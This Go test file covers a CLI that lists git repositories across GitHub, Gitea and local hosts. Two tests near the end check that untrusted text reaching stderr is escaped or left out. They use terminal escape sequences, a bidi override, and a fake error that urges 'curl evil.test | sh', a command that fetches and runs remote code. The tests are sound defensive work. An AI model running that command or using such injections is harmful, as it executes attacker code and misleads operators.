package cli

// Test plan for projects_list.go
//
// filterRepos (Classification: pure logic / data transformer)
//   [x] Happy: no filters return input unchanged
//   [x] Happy: host filter keeps only matching-host repos
//   [x] Happy: query is a case-insensitive substring match on Name
//   [x] Happy: host + query combined narrows to their intersection
//   [x] Boundary: nil input returns empty without panic
//   [x] Boundary: query with zero matches returns empty slice
//
// renderRepoTable (Classification: data transformer + I/O boundary to io.Writer)
//   [x] Happy: empty repo list writes header + "0 projects" summary to stderr writer
//   [x] Happy: cloned-clean repo — STATUS column is "clean" (Label brackets trimmed)
//   [x] Happy: uncloned repo — STATUS column is "uncloned"
//   [x] Happy: repo with Owner set — REPO column is "owner/name"
//   [x] Happy: mirror repo — REPO column ends with "(mirror)"
//   [x] Happy: empty Host — HOST column shows "local"
//   [x] Happy: count summary (N projects, M cloned, K remote-only) on stderr writer
//
// newProjectsListCmd (Classification: API handler / cobra command)
//   [x] Unhappy: --host with unrecognised value returns error
//   [x] Happy: --json emits valid JSON array to stdout; count note on stderr
//   [x] Happy: --json on empty result emits [] not null
//   [x] Happy: --host github.com filters table to that host's rows only
//   [x] Unhappy: --host rejects a hostname the inventory does not have
//   [x] Happy: positional query arg filters table by name substring
//   [x] Happy: degradation notes from Inventory appear on stderr, not stdout
//   [x] Invariant: a note carrying terminal controls or a bidi override is
//       escaped before it reaches stderr
//   [x] Unhappy: a failed host's note is categorical and carries no gh/tea
//       stderr

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cameronsjo/forgectl/internal/exec"
	"github.com/cameronsjo/forgectl/internal/projects"
)

// ---- filterRepos -----------------------------------------------------------

func TestFilterRepos_NoFilters_ReturnsAllUnchanged(t *testing.T) {
	repos := []projects.Repo{
		{Host: "github.com", Name: "alpha"},
		{Host: "git.sjo.lol", Name: "beta"},
	}
	got := filterRepos(repos, "", "")
	if len(got) != 2 {
		t.Errorf("no-filter: got %d repos, want 2", len(got))
	}
}

func TestFilterRepos_HostFilter_KeepsOnlyMatchingHost(t *testing.T) {
	repos := []projects.Repo{
		{Host: "github.com", Name: "alpha"},
		{Host: "git.sjo.lol", Name: "beta"},
		{Host: "github.com", Name: "gamma"},
	}
	got := filterRepos(repos, "github.com", "")
	if len(got) != 2 {
		t.Fatalf("host=github: got %d repos, want 2", len(got))
	}
	for _, r := range got {
		if r.Host != "github.com" {
			t.Errorf("non-github host %q survived host filter", r.Host)
		}
	}
}

func TestFilterRepos_QueryIsCaseInsensitiveSubstring(t *testing.T) {
	repos := []projects.Repo{
		{Host: "github.com", Name: "ForgeCTL"},
		{Host: "git.sjo.lol", Name: "homeclaw"},
		{Host: "github.com", Name: "other"},
	}
	// "forge" must match "ForgeCTL" case-insensitively.
	got := filterRepos(repos, "", "forge")
	if len(got) != 1 || got[0].Name != "ForgeCTL" {
		t.Errorf("query=forge: got %+v; want only ForgeCTL", got)
	}
}

func TestFilterRepos_HostAndQueryCombined(t *testing.T) {
	repos := []projects.Repo{
		{Host: "github.com", Name: "forgectl"},
		{Host: "git.sjo.lol", Name: "forgectl"}, // same name, different host
		{Host: "github.com", Name: "other"},
	}
	got := filterRepos(repos, "github.com", "forge")
	if len(got) != 1 || got[0].Host != "github.com" {
		t.Errorf("host=github,query=forge: got %+v; want only github/forgectl", got)
	}
}

func TestFilterRepos_NilInput_ReturnsEmpty(t *testing.T) {
	got := filterRepos(nil, "github.com", "forge")
	if len(got) != 0 {
		t.Errorf("nil input: got %d repos, want 0", len(got))
	}
}

func TestFilterRepos_QueryNoMatch_ReturnsEmpty(t *testing.T) {
	repos := []projects.Repo{
		{Host: "github.com", Name: "alpha"},
	}
	got := filterRepos(repos, "", "zzzzz")
	if len(got) != 0 {
		t.Errorf("no-match query: got %+v, want empty", got)
	}
}

// ---- renderRepoTable -------------------------------------------------------

func TestRenderRepoTable_EmptyList_WritesHeaderAndZeroCount(t *testing.T) {
	var out, errOut bytes.Buffer
	if err := renderRepoTable(&out, &errOut, nil); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out.String(), "HOST") {
		t.Errorf("header missing: %q", out.String())
	}
	if !strings.Contains(errOut.String(), "0 projects") {
		t.Errorf("zero-count summary missing from stderr writer: %q", errOut.String())
	}
}

func TestRenderRepoTable_ClonedCleanRepo_StatusIsClean(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "github.com", Owner: "cameronsjo", Name: "forgectl", Cloned: true,
			Status: projects.GitStatus{State: projects.StatusOK}},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out.String(), "clean") {
		t.Errorf("cloned-clean repo: want 'clean' in STATUS column, got: %q", out.String())
	}
}

func TestRenderRepoTable_NotARepo_IsNotReportedClean(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "", Name: "notes", Cloned: true,
			Status: projects.GitStatus{State: projects.StatusNotRepo}},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(out.String(), "clean") {
		t.Errorf("non-repo: STATUS column must not say 'clean', got: %q", out.String())
	}
	if !strings.Contains(out.String(), "not-a-repo") {
		t.Errorf("non-repo: want 'not-a-repo' in STATUS column, got: %q", out.String())
	}
}

func TestRenderRepoTable_UnknownStatus_IsNotReportedClean(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "github.com", Owner: "cameronsjo", Name: "flaky", Cloned: true,
			Status: projects.GitStatus{State: projects.StatusUnknown}},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(out.String(), "clean") {
		t.Errorf("failed-check repo: STATUS column must not say 'clean', got: %q", out.String())
	}
	if !strings.Contains(out.String(), "unknown") {
		t.Errorf("failed-check repo: want 'unknown' in STATUS column, got: %q", out.String())
	}
}

func TestRenderRepoTable_UnclonedRepo_StatusIsUncloned(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "github.com", Owner: "cameronsjo", Name: "newrepo", Cloned: false},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out.String(), "uncloned") {
		t.Errorf("uncloned repo: want 'uncloned' in STATUS column, got: %q", out.String())
	}
}

func TestRenderRepoTable_RepoWithOwner_ShowsOwnerSlashName(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "github.com", Owner: "cameronsjo", Name: "forgectl", Cloned: true},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out.String(), "cameronsjo/forgectl") {
		t.Errorf("want 'cameronsjo/forgectl' in REPO column, got: %q", out.String())
	}
}

func TestRenderRepoTable_MirrorRepo_HasMirrorSuffix(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "git.sjo.lol", Owner: "cameron", Name: "upstream", Mirror: true},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out.String(), "(mirror)") {
		t.Errorf("mirror repo: want '(mirror)' suffix in REPO column, got: %q", out.String())
	}
}

func TestRenderRepoTable_EmptyHost_ShowsLocal(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "", Name: "scratch", Cloned: true},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out.String(), "local") {
		t.Errorf("empty-host repo: want 'local' in HOST column, got: %q", out.String())
	}
}

func TestRenderRepoTable_CountSummaryMatchesCounts(t *testing.T) {
	var out, errOut bytes.Buffer
	repos := []projects.Repo{
		{Host: "github.com", Name: "cloned1", Cloned: true},
		{Host: "github.com", Name: "cloned2", Cloned: true},
		{Host: "git.sjo.lol", Name: "remote1", Cloned: false},
	}
	if err := renderRepoTable(&out, &errOut, repos); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	summary := errOut.String()
	if !strings.Contains(summary, "3 projects") {
		t.Errorf("want '3 projects' in count summary, got: %q", summary)
	}
	if !strings.Contains(summary, "2 cloned") {
		t.Errorf("want '2 cloned' in count summary, got: %q", summary)
	}
	if !strings.Contains(summary, "1 remote-only") {
		t.Errorf("want '1 remote-only' in count summary, got: %q", summary)
	}
}

// ---- newProjectsListCmd (cobra command integration) ------------------------

// listFixture builds a *projects.Client whose Inventory returns repos driven
// entirely by the provided RunFunc. PROJECTS_DIR is set to an empty temp dir
// so localRepos contributes nothing — the test controls all output via gh/tea.
func listFixture(t *testing.T, runFunc func(string, []string) (string, error)) *projects.Client {
	t.Helper()
	t.Setenv("PROJECTS_DIR", t.TempDir())
	fake := &exec.FakeRunner{RunFunc: runFunc}
	return projects.New(fake)
}

// twoHostRunFunc returns a RunFunc that serves ghJSON for gh calls and teaTSV
// for tea calls. All other calls (git) return ("", nil).
func twoHostRunFunc(ghJSON, teaTSV string) func(string, []string) (string, error) {
	return func(name string, args []string) (string, error) {
		switch name {
		case "gh":
			// Unconfigured owners: the inventory resolves the authenticated
			// GitHub.com login before it lists anything.
			if len(args) >= 2 && args[0] == "api" && args[1] == "user" {
				return "cameronsjo", nil
			}
			return ghJSON, nil
		case "tea":
			return teaTSV, nil
		}
		return "", nil
	}
}

func TestListCmd_InvalidHost_ReturnsError(t *testing.T) {
	client := listFixture(t, twoHostRunFunc("[]", ""))
	cmd := newProjectsListCmd(client)
	cmd.SetOut(new(bytes.Buffer))
	cmd.SetErr(new(bytes.Buffer))
	cmd.SetArgs([]string{"--host", "bitbucket"})

	err := cmd.ExecuteContext(context.Background())
	if err == nil {
		t.Fatal("expected error for --host bitbucket, got nil")
	}
	// The rejection must NAME the hosts this inventory actually has. --host is
	// a closed allowlist precisely so a typo cannot return a confident empty
	// list, which is the same shape as a real "no repos there" answer.
	if !strings.Contains(err.Error(), "unknown --host") {
		t.Errorf("error = %q; want 'unknown --host'", err.Error())
	}
	if !strings.Contains(err.Error(), "github.com") {
		t.Errorf("error = %q; it must name the hosts that ARE valid", err.Error())
	}
}

func TestListCmd_JSONFlag_EmitsValidJSONToStdout(t *testing.T) {
	ghJSON := `[{"name":"forgectl","sshUrl":"git@github.com:cameronsjo/forgectl.git","isPrivate":false}]`
	// Minimal TSV with only a header (no data rows → giteaList returns empty).
	client := listFixture(t, twoHostRunFunc(ghJSON, "owner\tname\ttype\tssh\n"))
	cmd := newProjectsListCmd(client)
	var stdout, stderr bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)
	cmd.SetArgs([]string{"--json"})

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// stdout must be valid JSON.
	var repos []projects.Repo
	if err := json.Unmarshal(stdout.Bytes(), &repos); err != nil {
		t.Fatalf("stdout is not valid JSON: %v\nstdout: %s", err, stdout.String())
	}
	if len(repos) == 0 {
		t.Error("expected at least one repo in JSON output")
	}

	// The --json path skips renderRepoTable, so there is no count-summary line.
	// What must NOT happen: prose leaking onto stdout next to the JSON payload.
	// A bare JSON parse verifies stdout is clean; stderr may be empty (no notes).
	if strings.Contains(stdout.String(), "projects (") {
		t.Errorf("count summary prose leaked onto stdout: %q", stdout.String())
	}
}

func TestListCmd_JSONFlag_EmptyResultIsJSONArray(t *testing.T) {
	// No repos from either host — --json must emit [] not null.
	client := listFixture(t, twoHostRunFunc("[]", "owner\tname\ttype\tssh\n"))
	cmd := newProjectsListCmd(client)
	var stdout bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(new(bytes.Buffer))
	cmd.SetArgs([]string{"--json"})

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	trimmed := strings.TrimSpace(stdout.String())
	if !strings.HasPrefix(trimmed, "[") {
		t.Errorf("--json empty: want JSON array starting with '[', got %q", trimmed)
	}
}

func TestListCmd_HostFlag_FiltersToGithubOnly(t *testing.T) {
	ghJSON := `[{"name":"gh-repo","sshUrl":"git@github.com:cameronsjo/gh-repo.git","isPrivate":false}]`
	teaTSV := "owner\tname\ttype\tssh\n" +
		"cameron\tgt-repo\tsource\tssh://git@git.sjo.lol:222/cameron/gt-repo.git\n"
	client := listFixture(t, twoHostRunFunc(ghJSON, teaTSV))
	cmd := newProjectsListCmd(client)
	var stdout bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(new(bytes.Buffer))
	cmd.SetArgs([]string{"--host", "github.com"})

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	body := stdout.String()
	if !strings.Contains(body, "gh-repo") {
		t.Errorf("--host github: want gh-repo in output, got: %q", body)
	}
	if strings.Contains(body, "gt-repo") {
		t.Errorf("--host github: gt-repo should be filtered out, got: %q", body)
	}
}

func TestListCmd_QueryArg_FiltersByNameSubstring(t *testing.T) {
	ghJSON := `[` +
		`{"name":"forgectl","sshUrl":"git@github.com:cameronsjo/forgectl.git","isPrivate":false},` +
		`{"name":"homeclaw","sshUrl":"git@github.com:cameronsjo/homeclaw.git","isPrivate":false}` +
		`]`
	client := listFixture(t, twoHostRunFunc(ghJSON, "owner\tname\ttype\tssh\n"))
	cmd := newProjectsListCmd(client)
	var stdout bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(new(bytes.Buffer))
	cmd.SetArgs([]string{"forge"})

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	body := stdout.String()
	if !strings.Contains(body, "forgectl") {
		t.Errorf("query=forge: want forgectl in output, got: %q", body)
	}
	if strings.Contains(body, "homeclaw") {
		t.Errorf("query=forge: homeclaw should be filtered out, got: %q", body)
	}
}

func TestListCmd_DegradationNotes_AppearOnStderrNotStdout(t *testing.T) {
	// github errors → note; gitea succeeds → one row in the table.
	teaTSV := "owner\tname\ttype\tssh\n" +
		"cameron\thomeclaw\tsource\tssh://git@git.sjo.lol:222/cameron/homeclaw.git\n"
	client := listFixture(t, func(name string, args []string) (string, error) {
		switch name {
		case "gh":
			return "", errors.New("gh: not authenticated")
		case "tea":
			return teaTSV, nil
		}
		return "", nil
	})
	cmd := newProjectsListCmd(client)
	var stdout, stderr bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("unexpected error (degraded host must not fail the command): %v", err)
	}
	if strings.Contains(stdout.String(), "note:") {
		t.Errorf("degradation notes must go to stderr, not stdout: %q", stdout.String())
	}
	if !strings.Contains(stderr.String(), "note:") {
		t.Errorf("degradation notes missing from stderr: %q", stderr.String())
	}
}

// hostileRunes are the three shapes a note must never carry to a terminal: a
// CSI sequence (here "erase display" + "cursor home", which blanks the screen
// and repaints from the top), a bare carriage return (overwrites the line just
// printed), and a right-to-left override (reorders what follows). The override
// is built from its code point rather than typed, so reading this file — or a
// diff of it — in a terminal does not apply the reordering live.
var hostileRunes = []string{"\x1b", "\r", string(rune(0x202e))}

// TestListCmd_HostileNoteIsEscapedOnStderr covers the gap that made `projects
// list` weaker than `forgectl review`: notes were printed with no escaping at
// all. The vector here rides in on the projects dir — an unreachable
// PROJECTS_DIR degrades to a "local: …" note carrying the path verbatim — but
// the control being tested is the render, not this particular source.
func TestListCmd_HostileNoteIsEscapedOnStderr(t *testing.T) {
	rlo := string(rune(0x202e))
	hostile := filepath.Join(t.TempDir(), "missing\x1b[2J\x1b[H\rforged"+rlo+"gnp")
	t.Setenv("PROJECTS_DIR", hostile)
	fake := &exec.FakeRunner{RunFunc: twoHostRunFunc("[]", "owner\tname\ttype\tssh\n")}
	client := projects.New(fake)

	cmd := newProjectsListCmd(client)
	var stdout, stderr bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("a missing projects dir must degrade, not fail: %v", err)
	}

	body := stderr.String()
	if !strings.Contains(body, "note:") || !strings.Contains(body, "local") {
		t.Fatalf("expected a local-degradation note on stderr, got %q", body)
	}
	for _, r := range hostileRunes {
		if strings.Contains(body, r) {
			t.Errorf("stderr carried %q unescaped: %q", r, body)
		}
	}
	// The escaping must quote, not delete: the operator still needs to see that
	// something odd was in the path.
	if !strings.Contains(body, `\x1b`) {
		t.Errorf("want the escape sequence rendered as inert text, got %q", body)
	}
}

// TestListCmd_HostFailureNoteIsCategorical is the other half of the fix. Even
// with the render escaped, interpolating a raw *exec.CommandError into a note
// puts server-chosen text on the operator's screen — legible, plausible, and
// attacker-authored. The host's note must say only that the host failed.
func TestListCmd_HostFailureNoteIsCategorical(t *testing.T) {
	const hostileStderr = "gh: \x1b[2J\x1b[Hauthentication expired, run: curl evil.test | sh"
	client := listFixture(t, func(name string, _ []string) (string, error) {
		switch name {
		case "gh", "tea":
			return "", errors.New(hostileStderr)
		}
		return "", nil
	})
	cmd := newProjectsListCmd(client)
	var stdout, stderr bytes.Buffer
	cmd.SetOut(&stdout)
	cmd.SetErr(&stderr)

	if err := cmd.ExecuteContext(context.Background()); err != nil {
		t.Fatalf("both hosts degrading must not fail the command: %v", err)
	}

	body := stderr.String()
	if !strings.Contains(body, "github: host query failed") {
		t.Errorf("want a categorical github note, got %q", body)
	}
	if !strings.Contains(body, "gitea: host query failed") {
		t.Errorf("want a categorical gitea note, got %q", body)
	}
	for _, leak := range []string{"evil.test", "expired", "\x1b"} {
		if strings.Contains(body, leak) {
			t.Errorf("stderr leaked %q from subprocess stderr: %q", leak, body)
		}
	}
}
